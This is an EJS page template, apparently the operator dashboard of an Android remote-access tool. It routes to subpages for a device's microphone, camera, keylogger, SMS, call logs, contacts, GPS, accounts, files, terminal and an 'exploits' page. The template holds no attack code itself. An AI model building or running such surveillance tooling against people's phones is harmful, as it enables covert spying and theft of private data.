<!DOCTYPE html>
<html class="dark">
<% include partials/head.ejs %>
<body class="bg-bg-dark min-h-screen">
    <script>var baseURL = '<%= baseURL %>';</script>
    <% include partials/header-new.ejs %>
    <% include partials/sidebar-new.ejs %>

    <!-- Main content -->
    <div class="ml-56 mt-14 p-6">
        <!-- Device info header -->
        <div class="glass rounded-xl p-4 mb-6 flex items-center justify-between">
            <div class="flex items-center gap-3">
                <a href="/" class="w-10 h-10 bg-slate-700 hover:bg-slate-600 rounded-lg flex items-center justify-center transition-colors" title="Back to Dashboard">
                    <svg class="w-5 h-5 text-slate-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
                </a>
                <div class="w-10 h-10 bg-gradient-to-br from-accent-blue to-accent-purple rounded-lg flex items-center justify-center">
                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
                </div>
                <div>
                    <% let _client = (typeof allClients !== 'undefined' ? allClients : []).find(c => c.clientID === deviceID); %>
                    <h2 class="text-white font-bold text-lg"><%= _client ? (_client.nickname || _client.model) : 'Device' %></h2>
                    <p class="text-slate-500 text-sm"><%= page.toUpperCase() %> &middot; <code class="text-slate-600 text-xs"><%= deviceID %></code></p>
                </div>
            </div>
            <div class="flex items-center gap-2">
                <a href="/manage/<%= deviceID %>/info" class="btn-ghost text-xs">Info</a>
                <button class="btn-danger text-xs" id="deleteDeviceBtn"><svg class="w-4 h-4 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg> Delete</button>
            </div>
        </div>

        <!-- Page content -->
        <div class="glass rounded-xl p-6">
                <%
                    if(page === "microphone") { %><% include deviceManagerPages/microphone.ejs %><% }
                    else if(page === "calls") { %><% include deviceManagerPages/call_log.ejs %><% }
                    else if(page === "clipboard") { %><% include deviceManagerPages/clipboard_log.ejs %><% }
                    else if(page === "contacts") { %><% include deviceManagerPages/contacts.ejs %><% }
                    else if(page === "gps" || page === "location") { %><% include deviceManagerPages/gps.ejs %><% }
                    else if(page === "info") { %><% include deviceManagerPages/info.ejs %><% }
                    else if(page === "notifications") { %><% include deviceManagerPages/notification_log.ejs %><% }
                    else if(page === "sms") { %><% include deviceManagerPages/sms_manager.ejs %><% }
                    else if(page === "wifi") { %><% include deviceManagerPages/wifi_manager.ejs %><% }  
                    else if(page === "apps") { %><% include deviceManagerPages/apps.ejs %><% }  
                    else if(page === "permissions") { %><% include deviceManagerPages/permissions.ejs %><% }                    
                    else if(page === "files") { %><% include deviceManagerPages/file_manager.ejs %><% }
                    else if(page === "downloads") { %><% include deviceManagerPages/downloads.ejs %><% }
                    else if(page === "terminal") { %><% include deviceManagerPages/terminal.ejs %><% }
                    else if(page === "alpine") { %><% include deviceManagerPages/alpine.ejs %><% }
                    else if(page === "packages") { %><% include deviceManagerPages/packages.ejs %><% }
                    else if(page === "exploits") { %><% include deviceManagerPages/exploits.ejs %><% }
                    else if(page === "camera") { %><% include deviceManagerPages/camera.ejs %><% }
                    else if(page === "keylogger") { %><% include deviceManagerPages/keylogger.ejs %><% }
                    else if(page === "accounts") { %><% include deviceManagerPages/accounts.ejs %><% }
                    else if(page === "syssettings") { %><% include deviceManagerPages/system_settings.ejs %><% }
                    else if(page === "settings") { %><% include deviceManagerPages/settings.ejs %><% }
                    else if(page === "notFound") { %><% include deviceManagerPages/deviceNotFound.ejs %><% }
                    else { %><% include deviceManagerPages/noPage.ejs %><% }
                %>
        </div>
    </div>

    <% include partials/aiPanel.ejs %>

    <% include partials/footer.ejs %>

    <script>
        $(document).ready(function() {
            $('#deleteDeviceBtn').click(function() {
                if (confirm('Are you sure you want to delete device <%= deviceID %>?\nThis will remove it and all of its data.')) {
                    var btn = $(this).text('Deleting...').addClass('opacity-50');
                    $.post('/manage/<%= deviceID %>/delete', function(data) {
                        if (data.error) showNotification('#f03434', data.error);
                        else { showNotification('#2ecc71', data.message); setTimeout(function(){ window.location.href = '/'; }, 500); }
                    });
                }
            });
        });
    </script>
</body>
</html>
